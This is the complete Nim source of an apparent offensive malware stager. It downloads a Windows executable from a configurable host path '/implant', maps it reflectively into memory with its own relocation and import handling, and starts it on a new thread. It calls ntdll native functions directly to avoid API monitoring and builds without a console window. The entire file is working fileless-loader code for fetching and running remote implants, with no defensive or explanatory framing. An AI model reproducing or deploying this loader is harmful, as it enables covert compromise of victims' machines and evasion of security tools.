# Nim stager - Downloads and executes PE in memory using ntdll syscalls
{.passL: "-lwinhttp".}
{.passL: "-lkernel32".}
{.passL: "-mwindows".}

import winim/lean
import winim/inc/winhttp

const
  STAGER_HOST = "HOST_PLACEHOLDER"
  STAGER_PORT = PORT_PLACEHOLDER

type
  NTSTATUS = LONG

  NtAllocateVirtualMemoryProc = proc(
    ProcessHandle: HANDLE,
    BaseAddress: ptr PVOID,
    ZeroBits: ULONG_PTR,
    RegionSize: ptr SIZE_T,
    AllocationType: ULONG,
    Protect: ULONG
  ): NTSTATUS {.stdcall.}

  NtProtectVirtualMemoryProc = proc(
    ProcessHandle: HANDLE,
    BaseAddress: ptr PVOID,
    RegionSize: ptr SIZE_T,
    NewProtect: ULONG,
    OldProtect: ptr ULONG
  ): NTSTATUS {.stdcall.}

  NtCreateThreadExProc = proc(
    ThreadHandle: ptr HANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: PVOID,
    ProcessHandle: HANDLE,
    StartRoutine: PVOID,
    Argument: PVOID,
    CreateFlags: ULONG,
    ZeroBits: SIZE_T,
    StackSize: SIZE_T,
    MaximumStackSize: SIZE_T,
    AttributeList: PVOID
  ): NTSTATUS {.stdcall.}

  NtWaitForSingleObjectProc = proc(
    Handle: HANDLE,
    Alertable: BOOLEAN,
    Timeout: ptr LARGE_INTEGER
  ): NTSTATUS {.stdcall.}

var
  fnNtAllocateVirtualMemory: NtAllocateVirtualMemoryProc
  fnNtProtectVirtualMemory: NtProtectVirtualMemoryProc
  fnNtCreateThreadEx: NtCreateThreadExProc
  fnNtWaitForSingleObject: NtWaitForSingleObjectProc

proc ntSuccess(status: NTSTATUS): bool {.inline.} =
  status >= 0

proc resolveFuncs(): bool =
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll == 0:
    return false

  fnNtAllocateVirtualMemory = cast[NtAllocateVirtualMemoryProc](GetProcAddress(ntdll, "NtAllocateVirtualMemory"))
  fnNtProtectVirtualMemory = cast[NtProtectVirtualMemoryProc](GetProcAddress(ntdll, "NtProtectVirtualMemory"))
  fnNtCreateThreadEx = cast[NtCreateThreadExProc](GetProcAddress(ntdll, "NtCreateThreadEx"))
  fnNtWaitForSingleObject = cast[NtWaitForSingleObjectProc](GetProcAddress(ntdll, "NtWaitForSingleObject"))

  return fnNtAllocateVirtualMemory != nil and fnNtProtectVirtualMemory != nil and
         fnNtCreateThreadEx != nil and fnNtWaitForSingleObject != nil

proc download(host: LPCWSTR, port: INTERNET_PORT, path: LPCWSTR): tuple[buf: ptr byte, size: DWORD] =
  result = (nil, 0.DWORD)

  let hSession = WinHttpOpen(nil, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nil, nil, 0)
  if hSession == nil:
    return
  defer: discard WinHttpCloseHandle(hSession)

  let hConnect = WinHttpConnect(hSession, host, port, 0)
  if hConnect == nil:
    return
  defer: discard WinHttpCloseHandle(hConnect)

  let hRequest = WinHttpOpenRequest(hConnect, "GET", path, nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0)
  if hRequest == nil:
    return
  defer: discard WinHttpCloseHandle(hRequest)

  if WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, nil, 0, 0, 0) == 0:
    return
  if WinHttpReceiveResponse(hRequest, nil) == 0:
    return

  var cap: SIZE_T = 0x100000
  var baseAddr: PVOID = nil

  if not ntSuccess(fnNtAllocateVirtualMemory(cast[HANDLE](-1), addr baseAddr, 0, addr cap, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)):
    return

  var buf = cast[ptr byte](baseAddr)
  var total: SIZE_T = 0

  while true:
    var bytesRead: DWORD = 0
    if WinHttpReadData(hRequest, cast[LPVOID](cast[SIZE_T](buf) + total), DWORD(cap - total), addr bytesRead) == 0:
      break
    if bytesRead == 0:
      break
    total += SIZE_T(bytesRead)

    if total >= cap - 0x10000:
      var newSize: SIZE_T = cap * 2
      var newBuf: PVOID = nil
      if not ntSuccess(fnNtAllocateVirtualMemory(cast[HANDLE](-1), addr newBuf, 0, addr newSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)):
        return
      copyMem(newBuf, buf, total)
      buf = cast[ptr byte](newBuf)
      cap = newSize

  if total > 0:
    result = (buf, DWORD(total))

proc mapPE(raw: ptr byte, rawSize: DWORD): PVOID =
  let rawAddr = cast[SIZE_T](raw)
  
  let dos = cast[ptr IMAGE_DOS_HEADER](raw)
  if dos.e_magic != IMAGE_DOS_SIGNATURE:
    return nil

  let nt = cast[ptr IMAGE_NT_HEADERS](rawAddr + SIZE_T(dos.e_lfanew))
  if nt.Signature != IMAGE_NT_SIGNATURE:
    return nil

  var imageSize: SIZE_T = SIZE_T(nt.OptionalHeader.SizeOfImage)
  var baseAddr: PVOID = nil

  if not ntSuccess(fnNtAllocateVirtualMemory(cast[HANDLE](-1), addr baseAddr, 0, addr imageSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)):
    return nil

  let mapped = cast[ptr byte](baseAddr)
  let mappedAddr = cast[SIZE_T](mapped)

  copyMem(mapped, raw, nt.OptionalHeader.SizeOfHeaders)

  let secBase = cast[SIZE_T](nt) + SIZE_T(sizeof(IMAGE_NT_HEADERS))
  for i in 0..<int(nt.FileHeader.NumberOfSections):
    let sec = cast[ptr IMAGE_SECTION_HEADER](secBase + SIZE_T(i * sizeof(IMAGE_SECTION_HEADER)))
    if sec.SizeOfRawData > 0:
      copyMem(
        cast[pointer](mappedAddr + SIZE_T(sec.VirtualAddress)),
        cast[pointer](rawAddr + SIZE_T(sec.PointerToRawData)),
        sec.SizeOfRawData
      )

  let delta = cast[int64](mapped) - cast[int64](nt.OptionalHeader.ImageBase)
  if delta != 0 and nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0:
    var reloc = cast[ptr IMAGE_BASE_RELOCATION](mappedAddr + SIZE_T(nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress))
    while reloc.VirtualAddress != 0:
      let count = (reloc.SizeOfBlock - DWORD(sizeof(IMAGE_BASE_RELOCATION))) div 2
      let entries = cast[ptr UncheckedArray[WORD]](cast[SIZE_T](reloc) + SIZE_T(sizeof(IMAGE_BASE_RELOCATION)))
      for j in 0..<int(count):
        let entry = entries[j]
        let relType = entry shr 12
        let offset = entry and 0xFFF
        if relType == IMAGE_REL_BASED_DIR64:
          let patch = cast[ptr uint64](mappedAddr + SIZE_T(reloc.VirtualAddress) + SIZE_T(offset))
          patch[] = cast[uint64](cast[int64](patch[]) + delta)
        elif relType == IMAGE_REL_BASED_HIGHLOW:
          let patch = cast[ptr uint32](mappedAddr + SIZE_T(reloc.VirtualAddress) + SIZE_T(offset))
          patch[] = cast[uint32](cast[int64](patch[]) + delta)
      reloc = cast[ptr IMAGE_BASE_RELOCATION](cast[SIZE_T](reloc) + SIZE_T(reloc.SizeOfBlock))

  if nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0:
    var imp = cast[ptr IMAGE_IMPORT_DESCRIPTOR](mappedAddr + SIZE_T(nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress))
    while imp.Name != 0:
      let modName = cast[LPCSTR](mappedAddr + SIZE_T(imp.Name))
      let module = LoadLibraryA(modName)
      if module != 0:
        var thunk = cast[ptr uint64](mappedAddr + SIZE_T(imp.FirstThunk))
        var origThunk = if imp.union1.OriginalFirstThunk != 0:
          cast[ptr uint64](mappedAddr + SIZE_T(imp.union1.OriginalFirstThunk))
        else:
          thunk
        while origThunk[] != 0:
          if (origThunk[] and uint64(IMAGE_ORDINAL_FLAG64)) != 0:
            thunk[] = cast[uint64](GetProcAddress(module, cast[LPCSTR](origThunk[] and 0xFFFF)))
          else:
            let name = cast[ptr IMAGE_IMPORT_BY_NAME](mappedAddr + SIZE_T(origThunk[]))
            thunk[] = cast[uint64](GetProcAddress(module, cast[LPCSTR](addr name.Name)))
          thunk = cast[ptr uint64](cast[SIZE_T](thunk) + 8)
          origThunk = cast[ptr uint64](cast[SIZE_T](origThunk) + 8)
      imp = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[SIZE_T](imp) + SIZE_T(sizeof(IMAGE_IMPORT_DESCRIPTOR)))

  for i in 0..<int(nt.FileHeader.NumberOfSections):
    let sec = cast[ptr IMAGE_SECTION_HEADER](secBase + SIZE_T(i * sizeof(IMAGE_SECTION_HEADER)))
    var prot: ULONG = PAGE_READONLY
    let chr = sec.Characteristics
    if (chr and IMAGE_SCN_MEM_EXECUTE) != 0:
      prot = if (chr and IMAGE_SCN_MEM_WRITE) != 0: PAGE_EXECUTE_READWRITE else: PAGE_EXECUTE_READ
    elif (chr and IMAGE_SCN_MEM_WRITE) != 0:
      prot = PAGE_READWRITE

    var secAddr: PVOID = cast[PVOID](mappedAddr + SIZE_T(sec.VirtualAddress))
    var secSize: SIZE_T = if sec.Misc.VirtualSize == 0: SIZE_T(sec.SizeOfRawData) else: SIZE_T(sec.Misc.VirtualSize)
    var oldProt: ULONG = 0
    discard fnNtProtectVirtualMemory(cast[HANDLE](-1), addr secAddr, addr secSize, prot, addr oldProt)

  return cast[PVOID](mappedAddr + SIZE_T(nt.OptionalHeader.AddressOfEntryPoint))

proc main(): int32 =
  if not resolveFuncs():
    return 1

  let hostW = newWideCString(STAGER_HOST)
  let pathW = newWideCString("/implant")

  let (buf, size) = download(cast[LPCWSTR](&hostW[0]), STAGER_PORT.INTERNET_PORT, cast[LPCWSTR](&pathW[0]))
  if buf == nil or size < 0x100:
    return 1

  let entry = mapPE(buf, size)
  if entry == nil:
    return 1

  var hThread: HANDLE = 0
  if not ntSuccess(fnNtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, nil, cast[HANDLE](-1), entry, nil, 0, 0, 0, 0, nil)):
    return 1

  discard fnNtWaitForSingleObject(hThread, 0, nil)
  return 0

when isMainModule:
  quit(main())
